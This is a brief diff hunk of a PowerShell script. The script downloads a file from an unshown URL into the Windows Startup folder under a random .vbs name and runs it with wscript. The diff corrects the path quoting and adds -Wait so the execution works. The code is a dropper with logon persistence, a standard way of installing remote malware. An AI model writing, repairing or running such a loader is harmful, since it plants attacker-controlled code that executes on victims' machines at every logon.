@@ -4,4 +4,4 @@ $destination = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9le
 # Download the file
 Invoke-WebRequest -Uri $url -OutFile $destination
 
-Start-Process -FilePath "wscript.exe" -ArgumentList "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9lepqn.vbs" -NoNewWindow
+Start-Process -FilePath "wscript.exe" -ArgumentList "`"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9lepqn.vbs`"" -NoNewWindow -Wait
